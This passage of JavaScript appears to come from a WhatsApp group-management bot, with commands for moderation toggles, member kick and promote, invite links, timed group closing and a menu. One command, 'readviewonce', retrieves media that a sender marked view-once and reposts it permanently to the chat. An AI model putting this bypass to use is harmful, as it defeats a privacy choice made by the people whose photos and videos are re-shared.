{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antisange":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antisange == true) return setReply(mess.on)
db.data.chats[m.chat].antisange = true
setReply(mess.cmd.antisange.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antisange == false) return setReply(mess.off)
db.data.chats[m.chat].antisange = false
setReply(mess.cmd.antisange.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI SANGE`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "antinsfw":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].antinsfw == true) return setReply(mess.on)
db.data.chats[m.chat].antinsfw = true
setReply(mess.cmd.antinsfw.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].antinsfw == false) return setReply(mess.off)
db.data.chats[m.chat].antinsfw = false
setReply(mess.cmd.antinsfw.off)
} else {
sock.sendButMessage(m.chat, `MODE ANTI NSFW`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "autorespongc":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].autorespongc == true) return setReply(mess.on)
db.data.chats[m.chat].autorespongc = true
setReply(mess.cmd.autorespongc.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].autorespongc == false) return setReply(mess.off)
db.data.chats[m.chat].autorespongc = false
setReply(mess.cmd.autorespongc.off)
} else {
sock.sendButMessage(m.chat, `MODE AUTO RESPON GROUP`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "autoreact":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].autoreact == true) return setReply(mess.on)
db.data.chats[m.chat].autoreact = true
setReply(mess.cmd.autoreact.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].autoreact == false) return setReply(mess.off)
db.data.chats[m.chat].autoreact = false
setReply(mess.cmd.autoreact.off)
} else {
sock.sendButMessage(m.chat, `MODE AUTO REACT`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "banchat":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].banchat == true) return setReply(mess.on)
db.data.chats[m.chat].banchat = true
setReply(mess.cmd.banchat.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].banchat == false) return setReply(mess.off)
db.data.chats[m.chat].banchat = false
setReply(mess.cmd.banchat.off)
} else {
sock.sendButMessage(m.chat, `MODE BANCHAT`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "welcome":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] === "on" || args[0] === "enable" || args[0] === "1") {
if (db.data.chats[m.chat].welcome == true) return setReply(mess.on)
db.data.chats[m.chat].welcome = true
setReply(mess.cmd.welcome.on)
} else if (args[0] === "off" || args[0] === "disable" || args[0] === "0") {
if (db.data.chats[m.chat].welcome == false) return setReply(mess.off)
db.data.chats[m.chat].welcome = false
setReply(mess.cmd.welcome.off)
} else {
sock.sendButMessage(m.chat, `MODE WELCOME`, copyrightnya, [
{ buttonId: `${prefix + command} on`, buttonText: { displayText: ON }, type: 1 },
{ buttonId: `${prefix + command} off`, buttonText: { displayText: OFF }, type: 1 }], setQuoted)
}
break
case "infogc":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
const url = await sock.groupInviteCode(m.chat)
let teks = `\`\`\`「  INFO GROUP  」\`\`\`
▸ Name : ${groupName}
▸ Owner : ${groupOwner !== undefined ? "@" + groupOwner.split("@")[0] : "Tidak diketahui"}
▸ Creation : ${moment(groupMetadata.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
▸ Total Admins : ${groupAdmins.length}
▸ Total Members : ${participants.map((x) => x.id).length}
▸ Link : ${isBotGroupAdmins? `https://chat.whatsapp.com/${url}` : "Botz Is Not Admin"}

\`\`\`「  SECURITY GROUP  」\`\`\`

▸ Anti Link : ${db.data.chats[m.chat].antilink? "ON✅" : "OFF❌"}
▸ Anti Link Group : ${db.data.chats[m.chat].antilinkgc? "ON✅" : "OFF❌"}
▸ Anti Link Youtube Channel : ${db.data.chats[m.chat].antilinkytchannel? "ON✅" : "OFF❌"}
▸ Anti Link Youtube Video : ${db.data.chats[m.chat].antilinkytvideo? "ON✅" : "OFF❌"}
▸ Anti Link Facebook : ${db.data.chats[m.chat].antilinkfb? "ON✅" : "OFF❌"}
▸ Anti Link Instagram : ${db.data.chats[m.chat].antilinkig? "ON✅" : "OFF❌"}
▸ Anti Link Telegram : ${db.data.chats[m.chat].antilinktele? "ON✅" : "OFF❌"}
▸ Anti Link Whatsapp : ${db.data.chats[m.chat].antilinkwa? "ON✅" : "OFF❌"}
▸ Anti Link Tiktok : ${db.data.chats[m.chat].antilinktiktok? "ON✅" : "OFF❌"}
▸ Anti Link Twitter : ${db.data.chats[m.chat].antilinktwitter? "ON✅" : "OFF❌"}
▸ Anti Virtex : ${db.data.chats[m.chat].antivirtex? "ON✅" : "OFF❌"}
▸ Anti Asing : ${db.data.chats[m.chat].antiasing? "ON✅" : "OFF❌"}
▸ Anti Tag : ${db.data.chats[m.chat].antitag? "ON✅" : "OFF❌"}
▸ Anti Delete : ${db.data.chats[m.chat].antidelete? "ON✅" : "OFF❌"}
▸ Anti View Once : ${db.data.chats[m.chat].antiviewonce? "ON✅" : "OFF❌"}
▸ Anti Toxic : ${db.data.chats[m.chat].antitoxic? "ON✅" : "OFF❌"}
▸ Anti Sange : ${db.data.chats[m.chat].antisange? "ON✅" : "OFF❌"}
▸ Anti Nsfw : ${db.data.chats[m.chat].antinsfw? "ON✅" : "OFF❌"}
▸ Auto Respon : ${db.data.chats[m.chat].autorespongc? "ON✅" : "OFF❌"}
▸ Auto React : ${db.data.chats[m.chat].autoreact? "ON✅" : "OFF❌"}
▸ Welcome : ${db.data.chats[m.chat].welcome? "ON✅" : "OFF❌"}
`
await setReply(teks) 
}
break
case "linkgc":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
const url = await sock.groupInviteCode(m.chat)
const asu = "https://chat.whatsapp.com/" + url
setReply(asu)
}
break
case "setppgc":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (isImage && !args[0] || isQuotedImage && !args[0]) {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const data = await sock.updateProfilePicture(m.chat, { url: media })
setReply(mess.success)
} else if (isImage && args[0] === "full" || isImage && args[0] === "/full" || isQuotedImage && args[0] === "full" || isQuotedImage && args[0] === "/full") {
const media = await sock.downloadAndSaveMediaMessage(quoted, "./ACTION/MEDIA/SAMPAH/" + randomNomor(10000))
const { img } = await generateProfilePicture(media)
await sock.query({ tag: "iq",attrs: { to: m.chat, type:"set", xmlns: "w:profile:picture"}, content: [{ tag: "picture", attrs: { type: "image" }, content: img }]})
setReply(mess.success)
} else setReply(mess.cmd.setppgc.text(prefix, command))
}
break
case "setnamagc":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!text) return setReply(mess.query.text)
await sock.groupUpdateSubject(m.chat, text)
setReply(mess.cmd.setnamagc.text(text))
}
break
case "setdesc":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!text) return setReply(mess.query.text)
await sock.groupUpdateDescription(m.chat, text)
setReply(mess.cmd.setdesc.text(text))
}
break
case "gc":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] == "close") {
sock.groupSettingUpdate(m.chat, "announcement")
setReply(mess.cmd.gc.close)
} else if (args[0] == "open") {
sock.groupSettingUpdate(m.chat, "not_announcement")
setReply(mess.cmd.gc.open)
} else {
sock.sendButMessage(m.chat, `GROUP OPEN/CLOSE`, copyrightnya, [
{ buttonId: `${prefix + command} open`, buttonText: { displayText: "𝙾𝙿𝙴𝙽" }, type: 1 },
{ buttonId: `${prefix + command} close`, buttonText: { displayText: "𝙲𝙻𝙾𝚂𝙴" }, type: 1 }], setQuoted)
}
break
case "revoke":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
await sock.groupRevokeInvite(m.chat)
setReply(mess.cmd.revoke.text)
}
break
case "hidetag":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
let mem = []
groupMembers.map((i) => mem.push(i.id))
sock.sendMessage(m.chat, { text: text ? text : "", mentions: mem })
}
break
case "tagall":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
let member = participants.map((x) => x.id)
let teks = `\`\`\`「  TAG ALL  」\`\`\`

*Message : ${text ? text : "no message"}*\n\n`
for (let x of member) {
teks += `» @${x.split("@")[0]}\n`
}
setReply(teks) 
}
break
case "add":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!Input) return setReply(mess.input)
if (Input.startsWith("08")) return setReply(mess.cmd.add.number)
if (participants.map((x) => x.id).includes(Input)) return setReply(mess.cmd.add.text1) 
await sock.groupParticipantsUpdate(m.chat, [Input], "add")
await setReply(mess.cmd.add.text2(Input, groupName))
}
break
case "kick":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!Input) return setReply(mess.input)
if (Input.startsWith("08")) return setReply(mess.cmd.kick.number)
if (!participants.map((x) => x.id).includes(Input)) return setReply(mess.cmd.kick.text1) 
if (Input == groupOwner) return setReply(mess.cmd.kick.text2) 
await sock.groupParticipantsUpdate(m.chat, [Input], "remove")
await setReply(mess.cmd.kick.text3(Input, groupName))
}
break
case "promote":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!Input) return setReply(mess.input)
if (Input.startsWith("08")) return setReply(mess.cmd.promote.number)
if (!participants.map((x) => x.id).includes(Input)) return setReply(mess.cmd.promote.text1) 
if (groupAdmins.includes(Input)) return setReply(mess.cmd.promote.text2) 
await sock.groupParticipantsUpdate(m.chat, [Input], "promote")
await setReply(mess.cmd.promote.text3(Input, groupName))
}
break
case "demote":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!Input) return setReply(mess.input)
if (Input.startsWith("08")) return setReply(mess.cmd.demote.number)
if (!participants.map((x) => x.id).includes(Input)) return setReply(mess.cmd.demote.text1) 
if (!groupAdmins.includes(Input)) return setReply(mess.cmd.demote.text2) 
await sock.groupParticipantsUpdate(m.chat, [Input], "demote")
await setReply(mess.cmd.demote.text3(Input, groupName))
}
break
case "opentime":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] == "seconds" && !args[1]) {
require("../../../ACTION/STORAGE/APP/SCR/GROUP/indexDetik")(sock, m, prefix, command, setQuoted)
} else if (args[0] == "minutes" && !args[1]) {
require("../../../ACTION/STORAGE/APP/SCR/GROUP/indexMenit")(sock, m, prefix, command, setQuoted)
} else if (args[0] == "hours" && !args[1]) {
require("../../../ACTION/STORAGE/APP/SCR/GROUP/indexJam")(sock, m, prefix, command, setQuoted)
} else if (args[0] == "days" && !args[1]) {
require("../../../ACTION/STORAGE/APP/SCR/GROUP/indexHari")(sock, m, prefix, command, setQuoted)
} else if (args[0] && args[1]) {
setTimeout(() => {
sock.groupSettingUpdate(m.chat, "announcement")
}, args[1])
setTimeout(() => {
sock.groupSettingUpdate(m.chat, "not_announcement")
}, 1000)
setReply(mess.cmd.opentime.text)
} else {
const sections = [ {
title: `PLEASE SELECT`,
rows: [
{title: mess.time.seconds.toUpperCase(), rowId: `${prefix + command} seconds`, description: `${command.toUpperCase()} ${mess.time.seconds.toUpperCase()}`},
{title: mess.time.minutes.toUpperCase(), rowId: `${prefix + command} minutes`, description: `${command.toUpperCase()} ${mess.time.minutes.toUpperCase()}`},
{title: mess.time.hours.toUpperCase(), rowId: `${prefix + command} hours`, description: `${command.toUpperCase()} ${mess.time.hours.toUpperCase()}`},
{title: mess.time.days.toUpperCase(), rowId: `${prefix + command} days`, description: `${command.toUpperCase()} ${mess.time.days.toUpperCase()}`},
]}]
const listMessage = { text: `${command.toUpperCase()}`, buttonText: "Click Here", sections }
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
}
break
case "closetime":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args[0] == "seconds" && !args[1]) {
require("../../../ACTION/STORAGE/APP/SCR/GROUP/indexDetik")(sock, m, prefix, command, setQuoted)
} else if (args[0] == "minutes" && !args[1]) {
require("../../../ACTION/STORAGE/APP/SCR/GROUP/indexMenit")(sock, m, prefix, command, setQuoted)
} else if (args[0] == "hours" && !args[1]) {
require("../../../ACTION/STORAGE/APP/SCR/GROUP/indexJam")(sock, m, prefix, command, setQuoted)
} else if (args[0] == "days" && !args[1]) {
require("../../../ACTION/STORAGE/APP/SCR/GROUP/indexHari")(sock, m, prefix, command, setQuoted)
} else if (args[0] && args[1]) {
setTimeout(() => {
sock.groupSettingUpdate(m.chat, "not_announcement")
}, args[1])
setTimeout(() => {
sock.groupSettingUpdate(m.chat, "announcement")
}, 1000)
setReply(mess.cmd.closetime.text)
} else {
const sections = [ {
title: `PLEASE SELECT`,
rows: [
{title: mess.time.seconds.toUpperCase(), rowId: `${prefix + command} seconds`, description: `${command.toUpperCase()} ${mess.time.seconds.toUpperCase()}`},
{title: mess.time.minutes.toUpperCase(), rowId: `${prefix + command} minutes`, description: `${command.toUpperCase()} ${mess.time.minutes.toUpperCase()}`},
{title: mess.time.hours.toUpperCase(), rowId: `${prefix + command} hours`, description: `${command.toUpperCase()} ${mess.time.hours.toUpperCase()}`},
{title: mess.time.days.toUpperCase(), rowId: `${prefix + command} days`, description: `${command.toUpperCase()} ${mess.time.days.toUpperCase()}`},
]}]
const listMessage = { text: `${command.toUpperCase()}`, buttonText: "Click Here", sections }
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
}
break
case "disappearing":
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (text == "off") {
sock.sendMessage(m.chat, { disappearingMessagesInChat: 0 })
} else if (text == "24 hours") {
sock.sendMessage(m.chat, { disappearingMessagesInChat: 86400 })
} else if (text == "7 days") {
sock.sendMessage(m.chat, { disappearingMessagesInChat: 604800 })
} else if (text == "90 days") {
sock.sendMessage(m.chat, { disappearingMessagesInChat: 7776000 })
} else {
const sections = [ {
title: `PLEASE SELECT`,
rows: [
{title: `OFF`, rowId: `${prefix + command} off`, description: `TYPE OFF`},
{title: `24 ${mess.time.hours.toUpperCase()}`, rowId: `${prefix + command} 24 hours`, description: `TYPE 24 ${mess.time.hours.toUpperCase()}`},
{title: `7 ${mess.time.days.toUpperCase()}`, rowId: `${prefix + command} 7 days`, description: `TYPE 7 ${mess.time.days.toUpperCase()}`},
{title: `90 ${mess.time.days.toUpperCase()}`, rowId: `${prefix + command} 90 days`, description: `TYPE 90 ${mess.time.days.toUpperCase()}`},
]}]
const listMessage = { text: `MESSAGE TIMER`, buttonText: "Click Here", sections }
sock.sendMessage(m.chat, listMessage, { quoted: setQuoted })
} 
break
case "kickme":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin()
await sock.groupParticipantsUpdate(m.chat, [m.sender], "remove")
await setReply(mess.success) 
}
break
case "getppgc":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
try {
var ppimg = await sock.profilePictureUrl(m.chat, "image")
} catch {
var ppimg = "https://raw.githubusercontent.com/Aztecs444/media/Zeck/image/profilePicture.jpg"
}
await sock.sendMessage(m.chat, { image: { url: ppimg } }, { quoted: setQuoted })
}
break
case "ceksewa":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
try{
var cekvip = db.data.expired[botNumber].sewa[m.chat].expired == "INFINITY"? "PERMANENT" : `${ms(db.data.expired[botNumber].sewa[m.chat].expired - Date.now()).days} ${mess.time.days} ${ms(db.data.expired[botNumber].sewa[m.chat].expired - Date.now()).hours} ${mess.time.hours} ${ms(db.data.expired[botNumber].sewa[m.chat].expired - Date.now()).minutes} ${mess.time.minutes} ${ms(db.data.expired[botNumber].sewa[m.chat].expired - Date.now()).seconds} ${mess.time.seconds}`
var date = db.data.expired[botNumber].sewa[m.chat].date
} catch {
if (db.data.chats[m.chat].sewa.status) {
var cekvip = `${ms(db.data.chats[m.chat].sewa.expired - Date.now()).days} ${mess.time.days} ${ms(db.data.chats[m.chat].sewa.expired - Date.now()).hours} ${mess.time.hours} ${ms(db.data.chats[m.chat].sewa.expired - Date.now()).minutes} ${mess.time.minutes} ${ms(db.data.chats[m.chat].sewa.expired - Date.now()).seconds} ${mess.time.seconds}`
var date = db.data.chats[m.chat].sewa.date
} else {
var cekvip = `0 ${mess.time.days} 0 ${mess.time.hours} 0 ${mess.time.minutes} 0 ${mess.time.seconds}`
var date = calender
}}
let teks = `\`\`\`「  INFO SEWA GROUP  」\`\`\`
▸ Name : ${groupName}
▸ Owner : ${groupOwner !== undefined ? "@" + groupOwner.split("@")[0] : "Tidak diketahui"}
▸ Creation : ${moment(groupMetadata.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")}
▸ Total Admins : ${groupAdmins.length}
▸ Total Members : ${participants.map((x) => x.id).length}
▸ Date : ${date}
▸ Expired : ${cekvip}
`
await setReply(teks) 
}
break
case "afk":{
if (m.isGroup && !isSewa) return onlySewa()
if (!m.isGroup) return onlyGroup()
if (!sock.checkDataName(command, dataId)) { sock.createDataId(command, dataId) }
sock.addDataId(command, m.sender, dataId)
setReply(mess.success) 
}
break
//=========================[ FITURE BOT ]=========================\\
case "menu":{
if (m.isGroup && !isSewa) return onlySewa()
let menu = menunya(sock, m, thePrefix, listblock, isDevoloper, isOwner, isPremium)
let allmenu = allMenu(prefix)
let button = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: `ᴏᴡɴᴇʀ` }, type: "RESPONSE" },
{ buttonId: `${prefix}sewa`, buttonText: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ` }, type: "RESPONSE" },
{ buttonId: `${prefix}dashboard`, buttonText: { displayText: `ᴅᴀsʜʙᴏᴀʀᴅ` }, type: 'RESPONSE' },
]
let templateButton = [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `${ownerNumber}` } },
{ urlButton: { displayText: `Devoloper`, url: `https://wa.me/${devoloperNumber}` } },
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `${prefix}sewa` } },
{ quickReplyButton: { displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`, id: `${prefix}dashboard` } },
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `${prefix}infobotz` } },
]
let options1 = {
externalAdReply: {
showAdAttribution: true,
title: `hallo kak👋 ${m.pushName}`,
body: "DONT CLICK HERE",
mediaType: 1,
renderLargerThumbnail: true,
thumbnail: ofrply,
sourceUrl: `https://wa.me/${ownerNumber}`,
}
}
let options2 = {
externalAdReply: {
showAdAttribution: true,
title: `hallo kak👋 ${m.pushName}`,
body: "DONT CLICK HERE",
mediaType: 1,
renderLargerThumbnail: false,
thumbnail: ofrply,
sourceUrl: `https://wa.me/${ownerNumber}`,
}
}
if (db.data.settings[botNumber].setmenu == "document") {
sock.sendButDoc(m.chat, menu + readmore + "\n" + allmenu, copyrightnya, dfrply, button, options1, { quoted: setQuoted })
} else if (db.data.settings[botNumber].setmenu == "location") {
sock.sendButLoc(m.chat, menu + readmore + "\n" + allmenu, copyrightnya, gfrply, button, { quoted: setQuoted })
} else if (db.data.settings[botNumber].setmenu == "image") {
sock.sendButImage(m.chat, menu + readmore + "\n" + allmenu, copyrightnya, ofrply, button, options2, { quoted: setQuoted })
} else if (db.data.settings[botNumber].setmenu == "gif") {
sock.sendButGif(m.chat, menu + readmore + "\n" + allmenu, copyrightnya, thumbnailvid, ofrply, button, { quoted: setQuoted })
} else if (db.data.settings[botNumber].setmenu == "video") {
sock.sendButVideo(m.chat, menu + readmore + "\n" + allmenu, copyrightnya, thumbnailvid, ofrply, button, { quoted: setQuoted })
} else if (db.data.settings[botNumber].setmenu == "location2") {
sock.send5ButLoc(m.chat, menu + readmore + "\n" + allmenu, copyrightnya, gfrply, templateButton, { quoted: setQuoted })
} else if (db.data.settings[botNumber].setmenu == "image2") {
sock.send5ButImg(m.chat, menu + readmore + "\n" + allmenu, copyrightnya, ofrply, templateButton, { quoted: setQuoted })
} else if (db.data.settings[botNumber].setmenu == "gif2") {
sock.send5ButGif(m.chat, menu + readmore + "\n" + allmenu, copyrightnya, thumbnailvid, ofrply, templateButton, { quoted: setQuoted })
} else if (db.data.settings[botNumber].setmenu == "video2") {
sock.send5ButVideo(m.chat, menu + readmore + "\n" + allmenu, copyrightnya, thumbnailvid, ofrply, templateButton, { quoted: setQuoted })
}
}
break
case "owner":
if (isOwner) {
sock.sendKontak(m.chat, [ownerNumber + "@s.whatsapp.net", ...Object.keys(db.data.expired[botNumber].owner), ...Object.keys(db.data.expired[botNumber].vip)], setQuoted) 
} else sock.sendKontak(m.chat, [ownerNumber + "@s.whatsapp.net", ...Object.keys(db.data.expired[botNumber].vip)], setQuoted) 
break
case "devoloper":
sock.sendContact(m.chat, devoloperNumber, "DEVOLOPER BOT", setQuoted) 
break
case "dashboard":{
if (m.isGroup && !isSewa) return onlySewa()
let teks = `
*Dashboard*
        
Runtime : ${runtime(process.uptime())}`
let fall = "*Commands Today*  \n"
let totalFail = []
let totalSuc = []
let total = 0
let tot = 0
await dash.map(async function (e, i) {
fall += "*•*" + ` ${toFirstCase(e.cmd)} : ${e.succes + e.failed} \n`
await totalFail.push(e.failed)
await totalSuc.push(e.succes)
})
for (let i = 0; i < totalFail.length; i++) {
total += totalFail[i]
}
for (let a = 0; a < totalSuc.length; a++) {
tot += totalSuc[a]
}
let akoh = `Total : ${dash.length} used`
let tod = "*Command Failed*\n"
let filteredArray = await dash.filter((item) => item.failed > 0)
await filteredArray.map(async function (e, i) {
tod += "*•*" + ` ${toFirstCase(e.cmd)} : ${e.failed} \n`
})
let aw = `Total : ${filteredArray.length} failed`
let tekz = teks + "\n\n" + fall + "\n" + akoh + "\n\n" + "*Command Status* \n" + " *•* Succes : " + tot + "\n" + " *•* Failed : " + total + "\n\n" + tod + "\n\n"
setReply(tekz)
}
break
case "report":{
if (m.isGroup && !isSewa) return onlySewa()
if (!text) return setReply(mess.query.text)
let teks = `Halo kak laporan dari @${m.sender.split("@")[0]}

Laporan: ${text}`
sock.sendMessage(nomerOwner+"@s.whatsapp.net", { text: teks, mentions: [m.sender] }) 
}
break
case "kalkulator":{
if (m.isGroup && !isSewa) return onlySewa()
if (q.split("+")[0] && q.split("+")[1]) {
const nilai_one = Number(q.split("+")[0])
const nilai_two = Number(q.split("+")[1])
setReply(`${nilai_one + nilai_two}`)
} else if (q.split("-")[0] && q.split("-")[1]) {
const nilai_one = Number(q.split("-")[0])
const nilai_two = Number(q.split("-")[1])
setReply(`${nilai_one - nilai_two}`)
} else if (q.split("×")[0] && q.split("×")[1]) {
const nilai_one = Number(q.split("×")[0])
const nilai_two = Number(q.split("×")[1])
setReply(`${nilai_one * nilai_two}`)
} else if (q.split("÷")[0] && q.split("÷")[1]) {
const nilai_one = Number(q.split("÷")[0])
const nilai_two = Number(q.split("÷")[1])
setReply(`${nilai_one / nilai_two}`)
} else setReply(mess.cmd.kalkulator.text(prefix, command))
}
break
case "getid":
if (m.isGroup && !isSewa) return onlySewa()
if (Input) {
setReply(Input)
} else {
setReply(m.chat)
}
break
case "getpp":{
if (m.isGroup && !isSewa) return onlySewa()
if (Input) {
try{
var ppimg = await sock.profilePictureUrl(Input, "image")
} catch {
var ppimg = "https://raw.githubusercontent.com/Aztecs444/media/Zeck/image/profilePicture.jpg"
}
await sock.sendMessage(m.chat, { caption: mess.success, image: { url: ppimg } }, { quoted: setQuoted })
} else {
try{
var ppimg = await sock.profilePictureUrl(m.sender, "image")
} catch {
var ppimg = "https://raw.githubusercontent.com/Aztecs444/media/Zeck/image/profilePicture.jpg"
}
await sock.sendMessage(m.chat, { caption: mess.success, image: { url: ppimg } }, { quoted: setQuoted })
}
}
break
case "getname":{
if (m.isGroup && !isSewa) return onlySewa()
if (Input) {
const name = await sock.getName(Input)
setReply(name)
} else {
const name = await sock.getName(m.sender)
setReply(name)
}
}
break
case "getnumber":
if (m.isGroup && !isSewa) return onlySewa()
if (mentionByReply) {
setReply(`${mentionByReply.split("@")[0]}`) 
} else if (mentionByTag[0] && m.isGroup) {
setReply(`${mentionByTag[0].split("@")[0]}`) 
} else setReply(mess.input) 
break
case "wame":
if (m.isGroup && !isSewa) return onlySewa()
if (Input) {
setReply(`wa.me/${Input.split("@")[0]}`) 
} else {
setReply(`wa.me/${m.sender.split("@")[0]}`)
}
break
case "readviewonce":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isQuotedViewOnce) return setReply(mess.reply.viewonce)
let type = Object.keys(m.quoted.message)[0]
let quotedType = m.quoted.message[type]
let media = await downloadContentFromMessage(quotedType, type == "imageMessage" ? "image" : "video")
let buffer = Buffer.from([])
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk])
}
if (/video/.test(type)) {
await sock.sendMessage(m.chat, { video: buffer, caption: quotedType.caption })
} else if (/image/.test(type)) {
await sock.sendMessage(m.chat, { image: buffer, caption: quotedType.caption })
}
} 
break
case "delsampah":{
if (m.isGroup && !isSewa) return onlySewa()
let files = fs.readdirSync("./ACTION/MEDIA/SAMPAH")
let data = files.splice("@adiwajshing", files.length - 1)
if (data.length == 0) return setReply(mess.cmd.delsampah.text1(data))
setReply(mess.cmd.delsampah.text1(data))
setTimeout(() => {
setReply(mess.cmd.delsampah.text2)
for (let x of data) {
fs.unlinkSync(`./ACTION/MEDIA/SAMPAH/${x}`)
}
}, 2000)
setTimeout(() => {
setReply(mess.cmd.delsampah.text3)
}, 5000)
}
break
case "del":
if (m.isGroup && !isSewa) return onlySewa()
if (!mentionByReply) return setReply(mess.reply.message)
if (mentionByReply == botNumber) {
